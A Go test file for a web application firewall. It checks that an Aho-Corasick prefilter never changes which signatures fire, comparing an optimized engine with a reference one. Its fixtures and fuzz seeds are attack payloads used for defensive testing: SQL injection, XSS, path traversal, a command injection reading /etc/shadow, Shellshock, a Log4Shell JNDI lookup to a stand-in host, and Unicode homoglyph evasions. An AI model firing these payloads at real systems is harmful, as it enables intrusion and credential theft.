package waf

import (
	"reflect"
	"sort"
	"strings"
	"testing"
	"time"
)

// REQ SVALINN-WAFSCAN-ACPREFILTER-001
//
// The Aho-Corasick body-literal prefilter skips evaluating a signature's
// "body" target only when NONE of that signature's own requiredLiterals
// were found present anywhere in body. This MUST NOT change Scan's output
// for any input, ever -- a wrong skip is a silent false negative in a WAF.
// This file proves behavioral equivalence between the optimized engine and
// a reference engine with the prefilter forced off (bodyACReady=false,
// guaranteed fallback to evaluating every signature directly -- the
// pre-optimization behavior), across a fixed corpus of real attack
// payloads and a fuzz corpus.

func newACReferenceEngine(t testing.TB) *Engine {
	t.Helper()
	e := newDefaultEngine(t)
	e.lock.Lock()
	e.bodyACReady = false
	e.lock.Unlock()
	return e
}

func acScanSummary(r *ScanResult) []string {
	ids := make([]string, 0, len(r.Matches))
	for _, m := range r.Matches {
		ids = append(ids, m.Signature.ID+"@"+m.Target)
	}
	return ids
}

func assertACScanParity(t *testing.T, optimized, reference *Engine, path, query, body, ua string, headers map[string]string) {
	t.Helper()
	// scanWithDeadline with a generous deadline, not the public Scan()
	// (REQ SVALINN-SCANBUDGET-001's default): AC-prefilter correctness and
	// scan-budget cost-bounding are two independent properties. reference
	// (bodyACReady forced false) must evaluate every signature directly
	// with no skip, so it's slower than optimized -- for a large enough
	// fuzzer-generated body, the two engines could legitimately finish
	// different numbers of signatures within the same tight real-world
	// budget, which would make this specific parity comparison noisy for a
	// reason that has nothing to do with AC-prefilter correctness. This
	// test needs both engines to run to full completion to isolate that.
	generousDeadline := time.Now().Add(time.Minute)
	got := optimized.scanWithDeadline(path, query, body, headers, ua, generousDeadline)
	want := reference.scanWithDeadline(path, query, body, headers, ua, generousDeadline)

	// Sorted, not exact-sequence, comparison: REQ SVALINN-SCANBUDGET-001
	// deliberately shuffles signature evaluation order per Scan call (an
	// anti-evasion measure, not a bug), so match order is no longer stable.
	// The actual invariant this test protects -- the SET of signatures that
	// fire must never change -- is unaffected by order and is what matters
	// for "a wrong skip is a silent false negative in a WAF."
	gotIDs, wantIDs := acScanSummary(got), acScanSummary(want)
	sort.Strings(gotIDs)
	sort.Strings(wantIDs)
	if !reflect.DeepEqual(gotIDs, wantIDs) {
		t.Fatalf("AC prefilter changed which signatures matched for body=%q\n  optimized: %v\n  reference: %v", body, gotIDs, wantIDs)
	}
	if got.Blocked != want.Blocked {
		t.Fatalf("AC prefilter changed Blocked for body=%q: optimized=%v reference=%v", body, got.Blocked, want.Blocked)
	}
	if got.Score != want.Score {
		t.Fatalf("AC prefilter changed Score for body=%q: optimized=%v reference=%v", body, got.Score, want.Score)
	}
}

func TestACPrefilter_ParityWithKnownAttackPayloads(t *testing.T) {
	optimized := newDefaultEngine(t)
	reference := newACReferenceEngine(t)

	cases := []string{
		"",
		"hello world",
		"'; DROP TABLE users;--",
		"' OR '1'='1",
		"<script>alert(1)</script>",
		"../../../../etc/passwd",
		"() { :;}; /bin/bash -c 'id'",
		"${jndi:ldap://evil/a}",
		strings.Repeat("x", 64*1024),
		"UNION SELECT username, password FROM users",
		"<img src=x onerror=alert(1)>",
		"1; cat /etc/shadow",
		"WAITFOR DELAY '0:0:5'",
		"BENCHMARK(5000000,MD5(1))",
		"1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))",
		// Overlapping/prefix-related literal case, deliberately -- this is
		// exactly the class of bug that "Iter" (vs "IterOverlapping") got
		// wrong during the spike that validated this approach.
		"xxxselectxselectxxx",
		// Unicode case-fold homoglyph cases -- found by Opus's judge pass.
		// Go's regexp (?i) is full Unicode simple case folding: 's'/'S'
		// also folds with U+017F (LATIN SMALL LETTER LONG S) and 'k'/'K'
		// also folds with U+212A (KELVIN SIGN). The AC automaton is
		// ASCII-only case-insensitive, so without the fold guard in Scan,
		// these bodies would match the real regex (reference) but not the
		// AC prefilter (optimized), silently skipping a real detection.
		"<ſcript>alert(1)</ſcript>",
		"' UNION ſELECT username,pasſword FROM users--",
	}

	for _, body := range cases {
		assertACScanParity(t, optimized, reference, "/taxii/collections/default/objects", "",
			body, "Mozilla/5.0", map[string]string{"Content-Type": "application/json"})
	}
}

// FuzzACPrefilter_Parity is the primary safety net: any random body string
// that would ever make the optimized engine and the reference engine
// disagree is a bug in the prefilter, full stop.
func FuzzACPrefilter_Parity(f *testing.F) {
	optimized := newDefaultEngine(f)
	reference := newACReferenceEngine(f)

	seeds := []string{
		"",
		"hello world",
		"'; DROP TABLE users;--",
		"<script>alert(1)</script>",
		"../../../../etc/passwd",
		"${jndi:ldap://evil/a}",
		"() { :;}; /bin/bash -c 'id'",
		"\x00\x01\x02\xff\xfe",
		"UNION SELECT SLEEP(5)",
		"xxxselectxselectxxx",
		"<ſcript>alert(1)</ſcript>",
		"' UNION ſELECT username,pasſword FROM users--",
	}
	for _, s := range seeds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, body string) {
		assertACScanParity(t, optimized, reference, "/x", "q=1", body, "ua", map[string]string{"H": "v"})
	})
}
